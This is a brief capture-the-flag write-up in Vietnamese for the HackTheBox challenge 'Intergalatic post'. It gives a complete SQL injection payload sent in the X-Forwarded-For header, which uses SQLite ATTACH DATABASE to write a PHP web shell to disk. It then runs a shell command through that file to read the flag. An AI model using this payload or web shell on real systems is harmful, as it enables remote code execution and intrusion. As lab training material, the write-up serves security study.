# Intergalatic post

sqli ở `X-Forwarded-For` header

```
X-Forwarded-For: blabla', '1@gmail.com');ATTACH DATABASE '/www/static/exp.php' AS exp;CREATE TABLE exp.pwn (dataz text);INSERT INTO exp.pwn (dataz) VALUES ('<?=system($_GET[0]); ?>');--
```

Sau đó access tới `URL/static/exp.php?0=cat /flag*`

**HTB{inj3ct3d_th3_tru7h}**